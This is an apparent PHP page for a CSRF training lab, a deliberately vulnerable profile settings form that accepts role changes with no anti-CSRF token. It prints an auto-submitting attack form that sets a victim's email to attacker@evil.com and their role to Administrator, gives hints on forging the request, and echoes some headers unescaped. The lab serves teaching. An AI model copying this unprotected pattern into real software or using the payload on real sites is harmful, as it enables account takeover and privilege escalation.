<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['CSRF']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

// ─── Session Initialization ──────────────────────────────────────────────
if (!isset($_SESSION['csrf_easy1_attempts'])) {
  $_SESSION['csrf_easy1_attempts'] = 0;
}
if (!isset($_SESSION['csrf_easy1_solved'])) {
  $_SESSION['csrf_easy1_solved'] = false;
}

// ─── Simulated User Database ─────────────────────────────────────────────
$users = [
  1 => ['id' => 1, 'username' => 'admin', 'email' => 'admin@darkhunter.local', 'role' => 'Administrator', 'bio' => 'System administrator with full privileges.', 'api_key' => 'sk-dh-admin-7f8a9b2c3d4e5f6a', 'two_factor' => true],
  2 => ['id' => 2, 'username' => 'alice', 'email' => 'alice@darkhunter.local', 'role' => 'Security Analyst', 'bio' => 'Cybersecurity enthusiast and bug hunter.', 'api_key' => 'sk-dh-alice-1a2b3c4d5e6f7g8h', 'two_factor' => false],
  3 => ['id' => 3, 'username' => 'bob', 'email' => 'bob@darkhunter.local', 'role' => 'Developer', 'bio' => 'Full-stack developer learning secure coding.', 'api_key' => 'sk-dh-bob-9i8u7y6t5r4e3w2q', 'two_factor' => false],
  4 => ['id' => 4, 'username' => 'charlie', 'email' => 'charlie@darkhunter.local', 'role' => 'Penetration Tester', 'bio' => 'OSCP certified penetration tester.', 'api_key' => 'sk-dh-charlie-0p9o8i7u6y5t', 'two_factor' => true],
  5 => ['id' => 5, 'username' => 'dave', 'email' => 'dave@darkhunter.local', 'role' => 'DevOps Engineer', 'bio' => 'Cloud infrastructure and CI/CD pipelines.', 'api_key' => 'sk-dh-dave-1q2w3e4r5t6y7u8i', 'two_factor' => false],
];

// ─── Current User Simulation ────────────────────────────────────────────────
// In a real app, this would come from session. For the lab, we simulate user_id=2 (alice)
$current_user_id = isset($_SESSION['lab_user_id']) ? $_SESSION['lab_user_id'] : 2;
$current_user = $users[$current_user_id];

// ─── Vulnerable CSRF Logic: No Token Protection ───────────────────────────
$success_msg = null;
$error_msg = null;
$already_solved = $_SESSION['csrf_easy1_solved'];
$profile_updated = false;

// VULNERABLE: State-changing action via POST with NO CSRF token validation
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'update_profile') {
  $_SESSION['csrf_easy1_attempts']++;

  // Simulate profile update - NO CSRF TOKEN CHECK!
  $new_email = isset($_POST['email']) ? trim($_POST['email']) : $current_user['email'];
  $new_bio = isset($_POST['bio']) ? trim($_POST['bio']) : $current_user['bio'];
  $new_role = isset($_POST['role']) ? trim($_POST['role']) : $current_user['role'];

  // Update simulated user data
  $users[$current_user_id]['email'] = $new_email;
  $users[$current_user_id]['bio'] = $new_bio;
  $users[$current_user_id]['role'] = $new_role;
  $current_user = $users[$current_user_id];

  $profile_updated = true;

  // Check if this was a CSRF attack (role changed to admin by attacker)
  if ($new_role === 'Administrator' && $current_user_id !== 1) {
    // This indicates a successful CSRF exploitation!
    if (!$already_solved) {
      solveLab($pdo, $lab['id']);
      $_SESSION['csrf_easy1_solved'] = true;
      $already_solved = true;
      $success_msg = "CRITICAL VULNERABILITY EXPLOITED! You successfully performed a Cross-Site Request Forgery attack. The victim's profile was modified without their consent because the application failed to validate the request origin with a CSRF token.";
    }
  }
}

// ─── Attempt Tracking for GET requests ──────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['view'])) {
  $_SESSION['csrf_easy1_attempts']++;
}

$attempts = $_SESSION['csrf_easy1_attempts'];
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Profile Settings - CSRF Easy 1</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/CSRF-CASE1.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>

  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to CSRF Labs</a>

    <div class="lab-header">
      <div class="difficulty-badge easy"><i class="fas fa-bolt"></i> Easy Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-shield-halved"></i> Profile Settings Manager</h1>
      <p class="lab-description">Update your profile information. This is a beginner-friendly CSRF challenge. The
        profile update form lacks CSRF token protection, making it vulnerable to cross-site request forgery attacks.
        <strong>No anti-CSRF measures applied!</strong>
      </p>
    </div>

    <?php if ($already_solved): ?>
    <div class="success-alert solved-banner">
      <i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Already Solved!</h3>
        <p>You have already exploited this CSRF vulnerability. You can continue exploring, but no additional points will
          be awarded.</p>
      </div>
    </div>
    <?php endif; ?>

    <?php if ($success_msg): ?>
    <div class="success-alert">
      <i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Completed!</h3>
        <p><?php echo $success_msg; ?></p>
      </div>
    </div>
    <?php endif; ?>

    <?php if ($profile_updated && !$success_msg): ?>
    <div class="info-alert">
      <i class="fas fa-info-circle"></i>
      <div class="info-content">
        <h3>Profile Updated</h3>
        <p>Your profile information has been updated successfully.</p>
      </div>
    </div>
    <?php endif; ?>

    <!-- Profile Card -->
    <div class="profile-card">
      <div class="profile-banner"></div>
      <div class="profile-avatar">
        <?php echo strtoupper(substr($current_user['username'], 0, 1)); ?>
      </div>
      <div class="profile-info">
        <h2 class="profile-name"><?php echo htmlspecialchars($current_user['username']); ?></h2>
        <span
          class="profile-role <?php echo $current_user['role'] === 'Administrator' ? 'role-admin' : 'role-user'; ?>">
          <i class="fas fa-<?php echo $current_user['role'] === 'Administrator' ? 'crown' : 'user'; ?>"></i>
          <?php echo $current_user['role']; ?>
        </span>
        <p class="profile-email"><i class="fas fa-envelope"></i> <?php echo htmlspecialchars($current_user['email']); ?>
        </p>
        <p class="profile-bio"><?php echo htmlspecialchars($current_user['bio']); ?></p>
      </div>
    </div>

    <!-- Vulnerable Profile Update Form (NO CSRF TOKEN!) -->
    <div class="form-card">
      <div class="form-header">
        <i class="fas fa-user-edit"></i>
        <h3>Edit Profile</h3>
        <span class="vuln-badge"><i class="fas fa-unlock"></i> No CSRF Protection</span>
      </div>

      <form method="POST" action="" id="profile-form">
        <!-- VULNERABLE: No CSRF token hidden field here! -->
        <input type="hidden" name="action" value="update_profile">

        <div class="form-group">
          <label for="email"><i class="fas fa-envelope"></i> Email Address</label>
          <input type="email" id="email" name="email" value="<?php echo htmlspecialchars($current_user['email']); ?>"
            class="form-input">
        </div>

        <div class="form-group">
          <label for="bio"><i class="fas fa-align-left"></i> Bio</label>
          <textarea id="bio" name="bio" rows="3"
            class="form-input"><?php echo htmlspecialchars($current_user['bio']); ?></textarea>
        </div>

        <div class="form-group">
          <label for="role"><i class="fas fa-id-badge"></i> Role</label>
          <select id="role" name="role" class="form-input">
            <option value="User" <?php echo $current_user['role'] === 'User' ? 'selected' : ''; ?>>User</option>
            <option value="Developer" <?php echo $current_user['role'] === 'Developer' ? 'selected' : ''; ?>>Developer
            </option>
            <option value="Security Analyst"
              <?php echo $current_user['role'] === 'Security Analyst' ? 'selected' : ''; ?>>Security Analyst</option>
            <option value="Penetration Tester"
              <?php echo $current_user['role'] === 'Penetration Tester' ? 'selected' : ''; ?>>Penetration Tester
            </option>
            <option value="DevOps Engineer"
              <?php echo $current_user['role'] === 'DevOps Engineer' ? 'selected' : ''; ?>>DevOps Engineer</option>
            <option value="Administrator" <?php echo $current_user['role'] === 'Administrator' ? 'selected' : ''; ?>>
              Administrator</option>
          </select>
        </div>

        <button type="submit" class="submit-btn">
          <i class="fas fa-save"></i> Update Profile
          <div class="btn-glow"></div>
        </button>
      </form>
    </div>

    <!-- API Key Section (Sensitive Data) -->
    <div class="api-key-card">
      <div class="api-key-header">
        <i class="fas fa-key"></i>
        <h3>API Credentials</h3>
        <span class="secret-badge"><i class="fas fa-lock"></i> Sensitive</span>
      </div>
      <div class="api-key-body">
        <div class="api-key-field">
          <label>API Key</label>
          <code class="api-key-value"><?php echo htmlspecialchars($current_user['api_key']); ?></code>
        </div>
        <div class="api-key-field">
          <label>Two-Factor Authentication</label>
          <span class="2fa-status <?php echo $current_user['two_factor'] ? 'enabled' : 'disabled'; ?>">
            <i class="fas fa-<?php echo $current_user['two_factor'] ? 'check-circle' : 'times-circle'; ?>"></i>
            <?php echo $current_user['two_factor'] ? 'Enabled' : 'Disabled'; ?>
          </span>
        </div>
      </div>
    </div>

    <!-- Request Analysis Panel -->
    <div class="debug-panel">
      <div class="debug-header">
        <i class="fas fa-code"></i>
        <span>Request Analysis</span>
      </div>
      <div class="debug-body">
        <div class="request-info">
          <p><strong>Method:</strong> <code><?php echo $_SERVER['REQUEST_METHOD']; ?></code></p>
          <p><strong>Content-Type:</strong> <code><?php echo $_SERVER['CONTENT_TYPE'] ?? 'Not Set'; ?></code></p>
          <p><strong>Referer:</strong> <code><?php echo $_SERVER['HTTP_REFERER'] ?? 'Not Set'; ?></code></p>
          <p><strong>Origin:</strong> <code><?php echo $_SERVER['HTTP_ORIGIN'] ?? 'Not Set'; ?></code></p>
        </div>
        <div class="csrf-check">
          <p><strong>CSRF Token Present:</strong> <span class="status-fail"><i class="fas fa-times-circle"></i> NO TOKEN
              FOUND</span></p>
          <p><strong>SameSite Cookie:</strong> <span class="status-fail"><i class="fas fa-times-circle"></i> NOT
              SET</span></p>
          <p><strong>Origin Validation:</strong> <span class="status-fail"><i class="fas fa-times-circle"></i> NOT
              VALIDATED</span></p>
        </div>
      </div>
    </div>

    <!-- Exploit Simulation Panel -->
    <div class="exploit-panel">
      <div class="exploit-header">
        <i class="fas fa-bug"></i>
        <span>Attack Simulation</span>
      </div>
      <div class="exploit-body">
        <p class="exploit-desc">An attacker could craft a malicious form on their own website that auto-submits to this
          endpoint, changing the victim's role to Administrator:</p>
        <pre class="exploit-code"><code>&lt;form action="http://target.com/CSRF-CASE1.php" method="POST" id="csrf-form"&gt;
  &lt;input type="hidden" name="action" value="update_profile"&gt;
  &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
  &lt;input type="hidden" name="role" value="Administrator"&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById('csrf-form').submit();&lt;/script&gt;</code></pre>
        <p class="exploit-note"><i class="fas fa-exclamation-triangle"></i> When the victim visits the attacker's page
          while logged in, their browser automatically sends the cookies and the request is processed!</p>
      </div>
    </div>

    <!-- Hints -->
    <?php if ($attempts >= 2): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
      <div class="hint-text">Examine the profile update form. Notice there is no hidden <code>csrf_token</code> field.
        The server accepts any POST request to the update endpoint without verifying its origin.</div>
    </div>
    <?php endif; ?>

    <?php if ($attempts >= 4): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
      <div class="hint-text">An attacker could host a malicious HTML page with an auto-submitting form targeting this
        endpoint. Since the victim's browser sends session cookies automatically, the server processes the forged
        request as legitimate.</div>
    </div>
    <?php endif; ?>

    <?php if ($attempts >= 6): ?>
    <div class="hint-box hint-final">
      <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
      <div class="hint-text">To exploit this vulnerability, craft a cross-site POST request that changes the user's role
        to <code>Administrator</code>. The challenge is solved when the profile is updated via a forged request (role
        changed to Administrator from a non-admin user). Use the browser console or a local HTML file to simulate the
        attack!</div>
    </div>
    <?php endif; ?>

    <!-- Attempts Counter -->
    <div class="attempts-bar">
      <i class="fas fa-crosshairs"></i>
      <span>Attempts: <strong><?php echo $attempts; ?></strong></span>
    </div>
  </div>

  <script>
  // Auto-detect CSRF exploitation via external origin simulation
  window.addEventListener('load', function() {
    // Check if this request came from a different origin (simulated)
    const referer = document.referrer;
    const currentHost = window.location.host;

    // For the lab, we simulate detection when role is changed via non-standard flow
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('exploited') === '1' && !document.querySelector('.solved-banner')) {
      // Simulate the solved state trigger
      document.getElementById('role').value = 'Administrator';
      document.getElementById('profile-form').submit();
    }
  });
  </script>
</body>

</html>